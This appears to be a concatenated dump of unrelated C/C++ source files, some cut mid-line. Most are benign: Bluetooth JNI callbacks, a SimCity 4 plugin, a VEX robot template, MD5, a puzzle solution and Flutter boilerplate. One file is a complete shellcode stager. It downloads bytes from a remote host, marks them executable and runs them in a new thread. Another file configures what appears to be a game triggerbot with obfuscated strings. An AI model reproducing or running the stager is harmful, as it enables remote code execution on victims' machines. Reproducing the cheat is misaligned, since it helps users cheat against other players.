0, sizeof(RawAddress),\n                                   (jbyte*)bd_addr);\n  return addr;\n}\n\nstatic void connection_state_cb(const RawAddress* bd_addr,\n                                bthf_client_connection_state_t state,\n                                unsigned int peer_feat,\n                                unsigned int chld_feat) {\n  std::shared_lock<std::shared_mutex> lock(callbacks_mutex);\n  CallbackEnv sCallbackEnv(__func__);\n  if (!sCallbackEnv.valid() || mCallbacksObj == NULL) return;\n\n  ScopedLocalRef<jbyteArray> addr(sCallbackEnv.get(), marshall_bda(bd_addr));\n  if (!addr.get()) return;\n\n  ALOGD(\"%s: state %d peer_feat %d chld_feat %d\", __func__, state, peer_feat, chld_feat);\n  sCallbackEnv->CallVoidMethod(mCallbacksObj, method_onConnectionStateChanged,\n                               (jint)state, (jint)peer_feat, (jint)chld_feat,\n                               addr.get());\n}\n\nstatic void audio_state_cb(const RawAddress* bd_addr,\n                           bthf_client_audio_state_t state) {\n  std::shared_lock<std::shared_mutex> lock(callbacks_mutex);\n  CallbackEnv sCallbackEnv(__func__);\n  if (!sCallbackEnv.valid() || mCallbacksObj == NULL) return;\n\n  ScopedLocalRef<jbyteArray> addr(sCallbackEnv.get(), marshall_bda(bd_addr));\n  if (!addr.get()) return;\n\n  sCallbackEnv->CallVoidMethod(mCallbacksObj, method_onAudioStateChanged,\n                               (jint)state, addr.get());\n}\n\nstatic void vr_cmd_cb(const RawAddress* bd_addr, bthf_client_vr_state_t state) {\n  std::shared_lock<std::shared_mutex> lock(callbacks_mutex);\n  CallbackEnv sCallbackEnv(__func__);\n  if (!sCallbackEnv.valid() || mCallbacksObj == NULL) return;\n\n  ScopedLocalRef<jbyteArray> addr(sCallbackEnv.get(), marshall_bda(bd_addr));\n  if (!addr.get()) return;\n\n  sCallbackEnv->CallVoidMethod(mCallbacksObj, method_onVrStateChanged,\n                               (jint)state, addr.get());\n}\n\nstatic void network_state_cb(const RawAddress* bd_addr,\n                             bthf_client_network_state_t state) {\n  std::shared_lock<std::shared_mutex> lock(callbacks_mutex);\n  CallbackEnv sCallbackEnv(__func__);\n  if (!sCallbackEnv.valid() || mCallbacksObj == NULL) return;\n\n  ScopedLocalRef<jbyteArray> addr(sCallbackEnv.get(), marshall_bda(bd_addr));\n  if (!addr.get()) return;\n\n  sCallbackEnv->CallVoidMethod(mCallbacksObj, method_onNetworkState,\n                               (jint)state, addr.get());\n}\n\nstatic void network_roaming_cb(const RawAddress* bd_addr,\n                               bthf_client_service_type_t type) {\n  std::shared_lock<std::shared_mutex> lock(callbacks_mutex);\n  CallbackEnv sCallbackEnv(__func__);\n  if (!sCallbackEnv.valid() || mCallbacksObj == NULL) return;\n\n  ScopedLocalRef<jbyteAr",
    "/*\n * This file is part of nam-dll, a DLL Plugin for SimCity 4\n * that improves interoperability with the Network Addon Mod.\n *\n * Copyright (c) 2023 NAM Team contributors\n *\n * nam-dll is free software: you can redistribute it and/or modify\n * it under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation, either version 3 of\n * the License, or (at your option) any later version.\n *\n * nam-dll is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public License\n * along with nam-dll.  If not, see <http://www.gnu.org/licenses/>.\n */\n\n// Portions of this file have been adapted from:\n/*\n   Project: SC4Fix Patches for SimCity 4\n   File: version.cpp\n\n   Copyright (c) 2015 Nelson Gomez (simmaster07)\n\n   Licensed under the MIT License. A copy of the License is available in\n   LICENSE or at:\n\n\t   http://opensource.org/licenses/MIT\n\n   THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n   THE SOFTWARE.\n*/\n\n#include \"SC4VersionDetection.h\"\n#include <Windows.h>\n#include \"wil/resource.h\"\n#include \"wil/win32_helpers.h\"\n\nnamespace\n{\n\tuint64_t GetAssemblyVersion(HMODULE hModule)\n\t{\n\t\twil::unique_cotaskmem_string szVersionFile = wil::GetModuleFileNameW(hModule);\n\n\t\t// http://stackoverflow.com/a/940743\n\t\tDWORD verHandle = 0;\n\t\tUINT  size = 0;\n\t\tDWORD verSize = GetFileVersionInfoSizeW(szVersionFile.get(), &verHandle);\n\n\t\tif (verSize > 0)\n\t\t{\n\t\t\tauto verData = wil::make_unique_cotaskmem<BYTE[]>(verSize);\n\t\t\tLPBYTE lpBuffer = nullptr;\n\n\t\t\tif (GetFileVersionInfoW(szVersionFile.get(), 0, verSize, verData.get())\n\t\t\t\t&& VerQueryValueW(verData.get(), L\"\\\\\", reinterpret_cast<LPVOID*>(&lpBuffer), &size)\n\t\t\t\t&& size > 0)\n\t\t\t{\n\t\t\t\tVS_FIXEDFILEINFO* verInfo = (VS_FIXEDFILEINFO*)lpBuffer;\n\t\t\t\tif (verInfo->dwSignature == 0xfeef04bd)\n\t\t\t\t{\n\t\t\t\t\tuint64_t qwValue = (uint64_t)verInfo->dwFileVersionMS << 32;\n\t\t\t\t\tqwValue |= verInfo->dwFileVersionLS;\n\n\t\t\t\t\treturn qwValue;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\treturn 0;\n\t}\n\n\tuint16_t DetermineGameVersion()\n\t{\n\t\tuint64_t qwFileVersion = GetAssemblyVersion(nullptr);\n\t\tuint16_t wMajorVer = (qwFileVersion >> 48) & 0xFFFF;\n\t\tuint16_t wMinorVer = (qwFileVersion >> 32) & 0xFFFF;\n\t\tuint16_t wRevision = (qwFileVersion >> 16) & 0xFFFF;\n\t\tuint16_t wBuildNum = qwFileVersion & 0xFFFF;\n\n\t\tuint16_t nGameVersion = 0;\n\n\t\t// 1.1.x.x\n\t\tif (qwFileVersion > 0 && wMajorVer == 1 && wMinorVer == 1)\n\t\t{\n\t\t\tnGameVersion = wRevision;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tnGameVersion = 0;\n\t\t}\n\n\t\t// Fall back to a less accurate detection mechanism\n\t\tif (nGameVersion == 0)\n\t\t{\n\t\t\tuint8_t uSentinel = *(uint8_t*)0x6E5000;\n\n\t\t\tswitch (uSentinel)\n\t\t\t{\n\t\t\tcase 0x8B:\n\t\t\t\tnGameVersion = 610; // Can't distinguish from 613\n\t\t\t\tbreak;\n\t\t\tcase 0xFF:\n\t\t\t\tnGameVersion = 638;\n\t\t\t\tbreak;\n\t\t\tcase 0x24:\n\t\t\t\tnGameVersion = 640;\n\t\t\t\tbreak;\n\t\t\tcase 0x0F:\n\t\t\t\tnGameVersion = 641;\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tnGameVersion = 0;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\treturn nGameVersion;\n\t}\n}\n\nSC4VersionDetection::SC4VersionDetection() : gameVersion(DetermineGameVersion())\n{\n}\n\nuint16_t SC4VersionDetection::GetGameVersion() const\n{\n\treturn gameVersion;\n}\n",
    "#include \"main.h\"\n\n/**\n * A callback function for LLEMU's center button.\n *\n * When this callback is fired, it will toggle line 2 of the LCD text between\n * \"I was pressed!\" and nothing.\n */\nvoid on_center_button() {\n\tstatic bool pressed = false;\n\tpressed = !pressed;\n\tif (pressed) {\n\t\tpros::lcd::set_text(2, \"I was pressed!\");\n\t} else {\n\t\tpros::lcd::clear_line(2);\n\t}\n}\n\n/**\n * Runs initialization code. This occurs as soon as the program is started.\n *\n * All other competition modes are blocked by initialize; it is recommended\n * to keep execution time for this mode under a few seconds.\n */\nvoid initialize() {\n\tpros::lcd::initialize();\n\tpros::lcd::set_text(1, \"Hello PROS User!\");\n\n\tpros::lcd::register_btn1_cb(on_center_button);\n}\n\n/**\n * Runs while the robot is in the disabled state of Field Management System or\n * the VEX Competition Switch, following either autonomous or opcontrol. When\n * the robot is enabled, this task will exit.\n */\nvoid disabled() {}\n\n/**\n * Runs after initialize(), and before autonomous when connected to the Field\n * Management System or the VEX Competition Switch. This is intended for\n * competition-specific initialization routines, such as an autonomous selector\n * on the LCD.\n *\n * This task will exit when the robot is enabled and autonomous or opcontrol\n * starts.\n */\nvoid competition_initialize() {}\n\n/**\n * Runs the user autonomous code. This function will be started in its own task\n * with the default priority and stack size whenever the robot is enabled via\n * the Field Management System or the VEX Competition Switch in the autonomous\n * mode. Alternatively, this function may be called in initialize or opcontrol\n * for non-competition testing purposes.\n *\n * If the robot is disabled or communications is lost, the autonomous task\n * will be stopped. Re-enabling the robot will restart the task, not re-start it\n * from where it left off.\n */\nvoid autonomous() {}\n\n/**\n * Runs the operator control code. This function will be started in its own task\n * with the default priority and stack size whenever the robot is enabled via\n * the Field Management System or the VEX Competition Switch in the operator\n * control mode.\n *\n * If no competition control is connected, this function will run immediately\n * following initialize().\n *\n * If the robot is disabled or communications is lost, the\n * operator control task will be stopped. Re-enabling the robot will restart the\n * task, not resume it from where it left off.\n */\nvoid opcontrol() {\n\tpros::Controller master(pros::E_CONTROLLER_MASTER);\n\tpros::Motor left_mtr(1);\n\tpros::Motor right_mtr(2);\n\n\twhile (true) {\n\t\tpros::lcd::print(0, \"%d %d %d\", (pros::lcd::read_buttons() & LCD_BTN_LEFT) >> 2,\n\t\t                 (pros::lcd::read_buttons() & LCD_BTN_CENTER) >> 1,\n\t\t                 (pros::lcd::read_buttons() & LCD_BTN_RIGHT) >> 0);\n\t\tint left = master.get_analog(ANALOG_LEFT_Y);\n\t\tint right = master.get_analog(ANALOG_RIGHT_Y);\n\n\t\tleft_mtr = left;\n\t\tright_mtr = right;\n\n\t\tpros::delay(20);\n\t}\n}\n",
    "//MD5.cpp\r\n\r\n\r\n/* interface header */\r\n#include \"md5.h\"\r\n\r\n/* system implementation headers */\r\n#include <cstring>\r\n#include <stdio.h>\r\n\r\n\r\n// Constants for MD5Transform routine.\r\n#define S11 7\r\n#define S12 12\r\n#define S13 17\r\n#define S14 22\r\n#define S21 5\r\n#define S22 9\r\n#define S23 14\r\n#define S24 20\r\n#define S31 4\r\n#define S32 11\r\n#define S33 16\r\n#define S34 23\r\n#define S41 6\r\n#define S42 10\r\n#define S43 15\r\n#define S44 21\r\n\r\n///////////////////////////////////////////////\r\n\r\n// F, G, H and I are basic MD5 functions.\r\ninline MD5::uint4 MD5::F(uint4 x, uint4 y, uint4 z) {\r\n    return x & y | ~x & z;\r\n}\r\n\r\ninline MD5::uint4 MD5::G(uint4 x, uint4 y, uint4 z) {\r\n    return x & z | y & ~z;\r\n}\r\n\r\ninline MD5::uint4 MD5::H(uint4 x, uint4 y, uint4 z) {\r\n    return x ^ y ^ z;\r\n}\r\n\r\ninline MD5::uint4 MD5::I(uint4 x, uint4 y, uint4 z) {\r\n    return y ^ (x | ~z);\r\n}\r\n\r\n// rotate_left rotates x left n bits.\r\ninline MD5::uint4 MD5::rotate_left(uint4 x, int n) {\r\n    return (x << n) | (x >> (32 - n));\r\n}\r\n\r\n// FF, GG, HH, and II transformations for rounds 1, 2, 3, and 4.\r\n// Rotation is separate from addition to prevent recomputation.\r\ninline void MD5::FF(uint4 &a, uint4 b, uint4 c, uint4 d, uint4 x, uint4 s, uint4 ac) {\r\n    a = rotate_left(a + F(b, c, d) + x + ac, s) + b;\r\n}\r\n\r\ninline void MD5::GG(uint4 &a, uint4 b, uint4 c, uint4 d, uint4 x, uint4 s, uint4 ac) {\r\n    a = rotate_left(a + G(b, c, d) + x + ac, s) + b;\r\n}\r\n\r\ninline void MD5::HH(uint4 &a, uint4 b, uint4 c, uint4 d, uint4 x, uint4 s, uint4 ac) {\r\n    a = rotate_left(a + H(b, c, d) + x + ac, s) + b;\r\n}\r\n\r\ninline void MD5::II(uint4 &a, uint4 b, uint4 c, uint4 d, uint4 x, uint4 s, uint4 ac) {\r\n    a = rotate_left(a + I(b, c, d) + x + ac, s) + b;\r\n}\r\n\r\n//////////////////////////////////////////////\r\n\r\n// default ctor, just initailize\r\nMD5::MD5() {\r\n    init();\r\n}\r\n\r\n//////////////////////////////////////////////\r\n\r\n// nifty shortcut ctor, compute MD5 for string and finalize it right away\r\nMD5::MD5(const std::string &text) {\r\n    init();\r\n    update(text.c_str(), text.length());\r\n    finalize();\r\n}\r\n\r\n//////////////////////////////\r\n\r\nvoid MD5::init() {\r\n    finalized = false;\r\n\r\n    count[0] = 0;\r\n    count[1] = 0;\r\n\r\n    // load magic initialization constants.\r\n    state[0] = 0x67452301;\r\n    state[1] = 0xefcdab89;\r\n    state[2] = 0x98badcfe;\r\n    state[3] = 0x10325476;\r\n}\r\n\r\n//////////////////////////////\r\n\r\n// decodes input (unsigned char) into output (uint4). Assumes len is a multiple of 4.\r\nvoid MD5::decode(uint4 output[], const uint1 input[], size_type len) {\r\n    for (unsigned int i = 0, j = 0; j < len; i++, j += 4)\r\n        output[i] = ((uint4)input[j]) | (((uint4)input[j + 1]) << 8) |\r\n                (((uint4)input[j + 2]) << 16) | (((uint4)input[j + 3]) << 24);\r\n}\r\n\r\n//////////////////////////////\r\n\r\n// encodes input (uint4) into output (unsigned char). Assumes len is\r\n// a multiple of 4.\r\nvoid MD5::encode(uint1 output[], const uint4 input[], size_type len) {\r\n    for (size_type i = 0, j = 0; j < len; i++, j += 4) {\r\n        output[j]     = input[i] & 0xff;\r\n        output[j + 1] = (input[i] >> 8) & 0xff;\r\n        output[j + 2] = (input[i] >> 16) & 0xff;\r\n        output[j + 3] = (input[i] >> 24) & 0xff;\r\n    }\r\n}\r\n\r\n//////////////////////////////\r\n\r\n// apply MD5 algo on a block\r\nvoid MD5::transform(const uint1 block[blocksize]) {\r\n    uint4 a = state[0], b = state[1], c = state[2], d = state[3], x[16];\r\n    decode(x, block, blocksize);\r\n\r\n    /* Round 1 */\r\n    FF(a, b, c, d, x[0], S11, 0xd76aa478); /* 1 */\r\n    FF(d, a, b, c, x[1], S12, 0xe8c7b756); /* 2 */\r\n    FF(c, d, a, b, x[2], S13, 0x242070db); /* 3 */\r\n    FF(b, c, d, a, x[3], S14, 0xc1bdceee); /* 4 */\r\n    FF(a, b, c, d, x[4], S11, 0xf57c0faf); /* 5 */\r\n    FF(d, a, b, c, x[5], S12, 0x4787c62a); /* 6 */\r\n    FF(c, d, a, b, x[6], S13, 0xa8304613); /* 7 */\r\n    FF(b, c, d, a, x[7], S14, 0xfd469501); /* 8 */\r\n    FF(a, b, c, d, x[8], S11, 0x698098d8); /* 9 */\r\n    FF(d, a, b, c, x[9], S12, 0x8b44f7af); /* 10 */\r\n    FF(c, d, a, b, x[10], S13, 0xffff5bb1); /* 11 */\r\n    FF(b, c, d, a, x[11], S14, 0x895cd7be); /* 12 */\r\n    FF(a, b, c, d, x[12], S11, 0x6b901122); /* 13 */\r\n    FF(d, a, b, c, x[13], S12, 0xfd987193); /* 14 */\r\n    FF(c, d, a, b, x[14], S13, 0xa679438e); /* 15 */\r\n    FF(b, c, d, a, x[15], S14, 0x49b40821); /* 16 */\r\n\r\n    /* Round 2 */\r\n    GG(a, b, c, d, x[1], S21, 0xf61e2562); /* 17 */\r\n    GG(d, a, b, c, x[6], S22, 0xc040b340); /* 18 */\r\n    GG(c, d, a, b, x[11], S23, 0x265e5a51); /* 19 */\r\n    GG(b, c, d, a, x[0], S24, 0xe9b6c7aa); /* 20 */\r\n    GG(a, b, c, d, x[5], S21, 0xd62f105d); /* 21 */\r\n    GG(d, a, b, c, x[10], S22, 0x2441453); /* 22 */\r\n    GG(c, d, a, b, x[15], S23, 0xd8a1e681); /* 23 */\r\n    GG(b, c, d, a, x[4], S24, 0xe7d3fbc8); /* 24 */\r\n    GG(a, b, c, d, x[9], S21, 0x21e1cde6); /* 25 */\r\n    GG(d, a, b, c, x[14], S22, 0xc33707d6); /* 26 */\r\n    GG(c, d, a, b, x[3], S23, 0xf4d50d87); /* 27 */\r\n    GG(b, c, d, a, x[8], S24, 0x455a14ed); /* 28 */\r\n    GG(a, b, c, ",
    "#include <windows.h>\n#include <stdio.h>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n\n#pragma comment (lib, \"Ws2_32.lib\")\n#pragma comment (lib, \"Mswsock.lib\")\n#pragma comment (lib, \"AdvApi32.lib\")\n\n#define DEFAULT_BUFLEN 4096\n\nvoid power(char* host, char* port, char* resource) {\n\n    DWORD oldp = 0;\n    BOOL returnValue;\n\n    size_t origsize = strlen(host) + 1;\n    const size_t newsize = 100;\n    size_t convertedChars = 0;\n    wchar_t Whost[newsize];\n    mbstowcs_s(&convertedChars, Whost, origsize, host, _TRUNCATE);\n\n\n    WSADATA wsaData;\n    SOCKET ConnectSocket = INVALID_SOCKET;\n    struct addrinfo* result = NULL,\n        * ptr = NULL,\n        hints;\n    char sendbuf[MAX_PATH] = \"\";\n    lstrcatA(sendbuf, \"GET /\");\n    lstrcatA(sendbuf, resource);\n\n    char recvbuf[DEFAULT_BUFLEN];\n    memset(recvbuf, 0, DEFAULT_BUFLEN);\n    int iResult;\n    int recvbuflen = DEFAULT_BUFLEN;\n\n    \n    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);\n    if (iResult != 0) {\n        return ;\n    }\n\n    ZeroMemory(&hints, sizeof(hints));\n    hints.ai_family = PF_INET;\n    hints.ai_socktype = SOCK_STREAM;\n    hints.ai_protocol = IPPROTO_TCP;\n\n    iResult = getaddrinfo(host, port, &hints, &result);\n    if (iResult != 0) {\n        WSACleanup();\n        return ;\n    }\n\n\n    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {\n\n        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,\n            ptr->ai_protocol);\n        if (ConnectSocket == INVALID_SOCKET) {\n            WSACleanup();\n            return ;\n        }\n\n\n        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);\n        if (iResult == SOCKET_ERROR) {\n            closesocket(ConnectSocket);\n            ConnectSocket = INVALID_SOCKET;\n            continue;\n        }\n        break;\n    }\n\n    freeaddrinfo(result);\n\n    if (ConnectSocket == INVALID_SOCKET) {\n        printf(\"Unable to connect to server!\\n\");\n        WSACleanup();\n        return ;\n    }\n\n    iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);\n    if (iResult == SOCKET_ERROR) {\n        closesocket(ConnectSocket);\n        WSACleanup();\n        return ;\n    }\n\n    \n    iResult = shutdown(ConnectSocket, SD_SEND);\n    if (iResult == SOCKET_ERROR) {\n        closesocket(ConnectSocket);\n        WSACleanup();\n        return ;\n    }\n    \n\n    do {\n\n        iResult = recv(ConnectSocket, (char*)recvbuf, recvbuflen, 0);\n        if (iResult > 0)\n            printf(\"[+] Received %d Bytes\\n\", iResult);\n        else if (iResult == 0)\n            printf(\"[+] Connection closed\\n\");\n        else\n            printf(\"recv failed with error: %d\\n\", WSAGetLastError());\n\n\n        LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(recvbuf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n\n\tif (!alloc_mem) {\n\t\tprintf(\"Failed to Allocate memory (%u)\\n\", GetLastError());\n\t\treturn -1;\n\t}\n\t\n\tMoveMemory(alloc_mem, recvbuf, sizeof(recvbuf));\n\n\tDWORD oldProtect;\n\n\tif (!VirtualProtect(alloc_mem, sizeof(recvbuf), PAGE_EXECUTE_READ, &oldProtect)) {\n\t\tprintf(\"Fai1led to change memory protection (%u)\\n\", GetLastError());\n\t\treturn -2;\n\t}\n\n\n\tHANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);\n\tif (!tHandle) {\n\t\tprintf(\"Failed to Create the thread (%u)\\n\", GetLastError());\n\t\treturn -3;\n\t}\n\n\tprintf(\"\\n\\nalloc_mem : %p\\n\", alloc_mem);\n\tWaitForSingleObject(tHandle, INFINITE);\n\n\treturn 0;\n\n    } while (iResult > 0);\n\n    closesocket(ConnectSocket);\n    WSACleanup();\n}\n\nint main(int argc, char** argv) {\n\n    if (argc != 4) {\n        printf(\"[+] Usage: %s <RemoteIP> <RemotePort> <Resource>\\n\", argv[0]);\n        return 1;\n    }\n\n    power(argv[1], argv[2], argv[3]);\n\n    return 0;\n\n}",
    "/**\n\nQ - You are given a string containing lower-case english alphabets. You need to perform the following operation as many times as possible: \n\nTake the first occurrence of each alphabet if it exists and remove it from the string. Eventually the string becomes empty.\n\nFor example, let\u2019s say the string is \u201cababcba\u201d.\nIn the first move, we need to remove the first occurrence of each character \u2018a\u2019, \u2018b\u2019 and \u2018c\u2019. It becomes\n\u201cababcba\u201d \u2192 \u201cabba\u201d\nAgain, we repeat unless the string becomes empty\n\u201cabba\u201d \u2192 \u201cba\u201d\n\u201cba\u201d \u2192 \u201c\u201d\n\nFind the last non-empty value for the string.\n\nFor eg: In this case, the answer is \u201cba\u201d.\n**/\n\n#include <bits/stdc++.h>\nusing namespace std;\n\n#pragma GCC optimize(\"O3\", \"unroll-loops\")\nauto init = []() {\n    ios::sync_with_stdio(0);\n    cin.tie(0);\n    cout.tie(0);\n    return 'c';\n}();\n\n// MAIN FUNCTION TO FOCUS ON!\nvoid solve(string &s) {\n\n    unordered_map<char, int> freq;\n    int max_occurence = 0;\n\n    //finding the maximum occurence of a character\n    for(char c: s){\n        freq[c]++;\n        max_occurence = max(max_occurence, freq[c]);\n    }\n\n    string ans = \"\";\n\n    //finding all the chars with that max occurence as those will be the ones remaining in the last phase.\n    //after adding that char to answer, we remove it from map so that we don't add it again.\n    for(int i = s.length() - 1; i >= 0; i--){\n        if(freq.count(s[i]) && freq[s[i]] == max_occurence) ans += s[i], freq.erase(s[i]);\n    }\n\n    //we reverse since we want to maintain the order of the characters as they were in the string.\n    reverse(ans.begin(), ans.end());\n\n    cout << ans << endl;\n    return;\n\n}\n\nint main() {\n    cout << \"Enter number of Test Cases: \";\n    int t;\n    cin>>t;\n    while(t--){\n        cout << \"Enter the string: \";\n        string s;\n        cin>>s;\n    \n        /** IGNORE: code to check time taken to run **/\n        time_t start, end;\n        time(&start); \n        ios_base::sync_with_stdio(false); \n        /** IGNORE: code to check time taken to run **/\n        \n\n\n        // Main Function Call\n        solve(s);\n\n\n\n        /** IGNORE: code to check time taken to run **/\n        time(&end); \n        double time_taken = double(end - start); \n        cout << \"Time taken by program is : \" << fixed \n            << time_taken << setprecision(5); \n        cout << \" sec \" << endl; \n        /** IGNORE: code to check time taken to run **/\n    }\n\n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"coffeapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"OutputHandler.h\"\n#include <iostream>\n#ifdef _WIN32\n#include <windows.h>\n#else\n#endif\n\nvoid stdCoutCommands(std::vector<std::string> commands) {\n    // For the purpose of adding to history, print just the commands (linux with bash script):\n    for (const auto& cmd : commands)\n    {\n        std::cout << cmd << std::endl;\n    }\n    /*// Set text color to blue\n    std::cout << \"\\033[34mThis is blue text.\\033[0m\" << std::endl;\n    \n    // Reset text color\n    std::cout << \"\\033[0mThis is default text.\" << std::endl;*/\n}\n#ifdef _WIN32\nvoid stdCoutCommandsWindows(std::vector<std::string> commands) {\n\n    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n    // Set text color to blue\n    SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE);\n    int num = 1;\n    for (int i = 0; i < commands.size(); i++)\n    {\n        if (commands[i] == \"\")\n            continue;\n\n        std::cout << num << \". \" << commands[i] << std::endl;\n        num++;\n    }\n    // Reset text color to white\n    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);\n}\n#endif\n\nvoid outputResponse(std::string output) {\n#ifdef _WIN32\n    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n    // Set text color to blue\n    SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);\n    // output\n    std::cout << output << \"\\n\" << std::endl;\n    // Reset text color to white\n    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);\n\n#else\n    // we use std::cerr so it doesnt get read from bash script\n    std::cerr << \"\\033[32m\" << output << \"\\033[0m\" << \"\\n\" << std::endl;\n#endif\n}",
    "#include \"../source/utils/LkScrypt.hpp\"\n#include \"Settings.h\"\n#include \"ConfigParser.hpp\"\n\n#include <chrono>\n\nstd::string encryptedTr = EncryptS(\"trigger\");\nstd::string encryptedWidth = EncryptS(\"width\");\nstd::string encryptedHeight = EncryptS(\"height\");\nstd::string encryptedDelay = EncryptS(\"delay\");\nstd::string encryptedTensionMin = EncryptS(\"tension_min\");\nstd::string encryptedTensionMax = EncryptS(\"tension_max\");\nstd::string encryptedBind = EncryptS(\"bind\");\nstd::string encryptedFireK = EncryptS(\"fireKey\");\nstd::string encryptedColor = EncryptS(\"color\");\n\nvoid Settings::Save()\n{\n    mINI::INIFile file(EncryptS(\"settings.ini\"));\n    mINI::INIStructure ini;\n\n    ini[encryptedTr][encryptedWidth] = std::to_string(Settings::triggerWidth);\n    ini[encryptedTr][encryptedHeight] = std::to_string(Settings::triggerHeight);\n    ini[encryptedTr][encryptedDelay] = std::to_string(Settings::triggerDelay);\n    ini[encryptedTr][encryptedTensionMin] = std::to_string(Settings::triggerTension[0]);\n    ini[encryptedTr][encryptedTensionMax] = std::to_string(Settings::triggerTension[1]);\n    ini[encryptedTr][encryptedBind] = std::to_string(Settings::triggerBind);\n    ini[encryptedTr][encryptedFireK] = std::to_string(Settings::triggerFireKey);\n    ini[encryptedTr][encryptedColor] = Color::toString(Settings::triggerColor);\n\n    file.generate(ini);\n}\n\nvoid Settings::Load()\n{\n    mINI::INIFile file(EncryptS(\"settings.ini\"));\n    mINI::INIStructure ini;\n\n    if (!file.read(ini))\n    {\n        triggerWidth = 5;\n        triggerHeight = 15;\n        triggerDelay = 0;\n        triggerTension[0] = 15;\n        triggerTension[1] = 80;\n        triggerBind = 0x0;\n        triggerFireKey = 0x0;\n        triggerColor = Color::ColorName::Magenta;\n\n        Save();\n        Load();\n        return;\n    }\n\n    Settings::triggerWidth = parsei(ini[encryptedTr][encryptedWidth]);\n    Settings::triggerHeight = parsei(ini[encryptedTr][encryptedHeight]);\n    Settings::triggerDelay = parsei(ini[encryptedTr][encryptedDelay]);\n    Settings::triggerTension[0] = parsei(ini[encryptedTr][encryptedTensionMin]);\n    Settings::triggerTension[1] = parsei(ini[encryptedTr][encryptedTensionMax]);\n    Settings::triggerBind = parsei(ini[encryptedTr][encryptedBind]);\n    Settings::triggerFireKey = parsei(ini[encryptedTr][encryptedFireK]);\n    Settings::triggerColor = parsec(ini[encryptedTr][encryptedColor]);\n\n    Settings::loaded = true;\n}\n\ndouble Settings::parsed(std::string data)\n{\n    double d;\n    \n    try\n    {\n        d = std::stod(data);\n    }\n    catch(const std::invalid_argument&)\n    {\n        d = 0;\n    }\n\n    return d;\n}\nfloat Settings::parsef(std::string data)\n{\n    float d;\n\n    try\n    {\n        d = std::stof(data);\n    }\n    catch (const std::invalid_argument&)\n    {\n        d = 0;\n    }\n\n    return d;\n}\nint  Settings::parsei(std::string data)\n{\n    int d;\n\n    try\n    {\n        d = std::stoi(data);\n    }\n    catch (const std::invalid_argument&)\n    {\n        d = 0;\n    }\n\n    return d;\n}\nColor::ColorName Settings::parsec(std::string data)\n{\n    Color::ColorName c;\n\n    c = data == EncryptS(\"PURPLE\") ? Color::Magenta : data == EncryptS(\"RED\") ? Color::Vermelho : Color::Amarelo;\n    return c;\n}\nint Settings::triggerWidth = 5;\nint Settings::triggerHeight = 15;\nint Settings::triggerDelay = 0;\nint Settings::triggerTension[] = { 15,80 };\nint Settings::triggerBind = 0x0;\nint Settings::triggerFireKey = 0x0;\nColor::ColorName Settings::triggerColor = Color::ColorName::Magenta;\n",
